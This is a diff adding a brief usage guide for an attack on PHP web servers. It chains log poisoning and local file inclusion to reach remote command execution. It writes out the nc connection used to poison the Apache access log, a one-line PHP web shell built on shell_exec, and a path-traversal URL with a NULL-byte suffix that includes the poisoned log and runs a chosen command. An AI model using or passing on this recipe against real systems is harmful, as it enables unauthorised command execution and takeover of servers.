@@ -1,0 +1,16 @@
+Usage:
+
+1. First poison the logs of the target server with nc:
+nc -nv 10.x.x.x 80
+
+
+2. Then paste the content of the malicious php file that you want to execute:
+<?php echo shell_exec($_GET['cmd']);?>
+
+
+3. Set the parameter cmd=ipconfig or the command of your choice. And after that, use an unsanitized parameter to include this log file:
+http://10.x.x.x.x/index.php?cmd=ipconfig&LANG=../../../../../../xampp/apache/logs/access.log%00
+
+%00 is the NULL byte valid for versions of PHP < 5.3.
+
+
